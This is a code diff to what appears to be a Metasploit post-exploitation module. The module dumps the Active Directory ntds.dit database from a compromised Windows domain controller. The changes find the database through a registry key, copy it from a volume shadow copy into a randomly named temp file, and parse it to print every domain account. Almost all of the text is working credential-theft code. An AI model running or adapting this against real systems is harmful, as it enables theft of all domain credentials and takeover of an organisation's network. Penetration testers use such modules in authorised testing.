@@ -28,6 +28,7 @@ class Metasploit3 < Msf::Post
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
   ))
+    deregister_options('SMBUser','SMBPass', 'SMBDomain')
   end
 
   def run
@@ -36,7 +37,7 @@ class Metasploit3 < Msf::Post
       unless ntds_file.nil?
         print_status "Repairing NTDS database after copy..."
         print_status repair_ntds(ntds_file)
-        realm = domain_name
+        realm = sysinfo["Domain"]
         ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
         ntds_parser.each_account do |ad_account|
           print_good ad_account.to_s
@@ -67,13 +68,16 @@ class Metasploit3 < Msf::Post
     database_file_path
   end
 
-  def domain_name
-    result = cmd_exec('cmd.exe', '/c systeminfo | findstr /B /C:"Domain"')
-    result.gsub!(/Domain:\s+/,'')
+  def is_domain_controller?
+    if ntds_location
+      file_exist?("#{ntds_location}\\ntds.dit")
+    else
+      false
+    end
   end
 
-  def is_domain_controller?
-    file_exist?('%SystemDrive%\Windows\ntds\ntds.dit')
+  def ntds_location
+    @ntds_location ||= registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\","DSA Working Directory")
   end
 
   def ntdsutil_method
@@ -93,23 +97,18 @@ class Metasploit3 < Msf::Post
 
 
   def preconditions_met?
-    status = true
-    unless is_domain_controller?
-      print_error "This does not appear to be an AD Domain Controller"
-      status = false
-    end
     unless is_admin?
       print_error "This module requires Admin privs to run"
-      status = false
+      return false
     end
-    if is_uac_enabled?
-      print_error "This module requires UAC to be bypassed first"
-      status = false
+    unless is_domain_controller?
+      print_error "This does not appear to be an AD Domain Controller"
+      return false
     end
     unless session_compat?
-      status = false
+      return false
     end
-    return status
+    return true
   end
 
   def repair_ntds(path='')
@@ -143,10 +142,12 @@ class Metasploit3 < Msf::Post
   end
 
   def vss_method
-    id = create_shadowcopy("#{get_env("%SystemDrive%")}\\")
+    location = ntds_location.dup
+    volume = location.slice!(0,3)
+    id = create_shadowcopy("#{volume}")
     print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
-    sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
+    sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
     target_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     print_status "Moving ntds.dit to #{target_path}"
     move_file(sc_path, target_path)
